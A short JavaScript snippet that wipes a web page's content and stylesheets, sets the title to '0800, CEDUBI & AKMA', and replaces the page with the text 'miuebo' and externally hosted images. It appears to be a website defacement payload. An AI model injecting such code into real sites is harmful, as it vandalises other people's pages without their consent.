document.body.innerHTML = '';

document.querySelectorAll('link[rel="stylesheet"]').forEach(function(link) {
    link.parentNode.removeChild(link);
});

document.title = "0800, CEDUBI & AKMA"; 

var p = document.createElement('p'); 
p.textContent = "miuebo"; 
document.body.appendChild(p); 

var img = document.createElement('img'); 
img.src = "https://i.ibb.co/cb7jrzP/mussi.png";
img.style.width = "150px";
document.body.appendChild(img); 

var imgg = document.createElement('img'); 
imgg.src = "https://i.ibb.co/cb7jrzP/mussi.png"; 
imgg.style.width = "150px";
document.body.appendChild(imgg);

var imggg = document.createElement('img'); 
imggg.src = "https://www.cda.org.ar/img_articulos/images/photos/0800gratis.png"; 
document.body.appendChild(imggg);

var imgggg = document.createElement('img'); 
imgggg.src = "https://www.cda.org.ar/img_articulos/images/photos/0800gratis.png"; 
document.body.appendChild(imgggg);
